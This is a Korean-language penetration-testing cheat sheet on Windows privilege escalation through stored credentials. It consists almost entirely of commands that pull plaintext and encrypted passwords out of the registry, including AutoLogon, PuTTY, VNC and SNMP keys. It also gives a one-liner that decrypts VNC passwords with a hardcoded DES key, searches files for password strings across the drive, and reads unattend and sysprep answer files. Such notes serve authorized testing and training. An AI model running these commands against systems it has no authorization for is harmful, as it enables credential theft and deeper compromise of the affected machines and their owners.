# 07_레지스트리자격증명

# 윈도우 권한상승 — 레지스트리 자격증명

---

## AutoLogon (평문 패스워드)

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
:: → DefaultUserName, DefaultPassword, DefaultDomainName 확인
```

---

## 전체 패스워드 검색

```bash
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

:: 대소문자 무시
reg query HKLM /f pass /t REG_SZ /s /k
```

---

## PuTTY 저장 세션

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
:: → ProxyPassword, PublicKeyFile 등
```

---

## VNC 패스워드

```bash
:: TightVNC
reg query "HKCU\Software\TightVNC\Server"
reg query "HKLM\Software\TightVNC\Server"

:: RealVNC
reg query "HKLM\Software\RealVNC\WinVNC4" /v password

:: UltraVNC
reg query 'HKLM\SOFTWARE\uvnc bvba\UltraVNC'

:: 복호화(VNC는 DES로 암호화)
# https://github.com/billchaison/VNCDecrypt
echo -n PASSWORD_HEX | xxd -r -p | openssl enc -des-cbc --nopad --nosalt \
  -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
```

---

## SNMP

```bash
reg query "HKLM\System\CurrentControlSet\Services\SNMP"
```

---

## 파일에서 패스워드 검색

```bash
:: 현재 디렉터리 및 하위
findstr /si password *.txt *.ini *.config *.xml *.php

:: 전체 드라이브
findstr /spin "password" C:\*.*

:: 특정 확장자
dir /s *pass* == *vnc* == *.config 2>nul
dir /s /b *.xml *.ini *.txt 2>nul | findstr -i pass
```

---

## Unattended / Sysprep

```bash
dir /s C:\*unattend* C:\*sysprep* C:\*answer*

type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml
type C:\Windows\System32\sysprep\sysprep.xml
type C:\Windows\System32\sysprep.inf
```

패스워드는 보통 base64 → `echo BASE64 | base64 -d` 로 디코딩
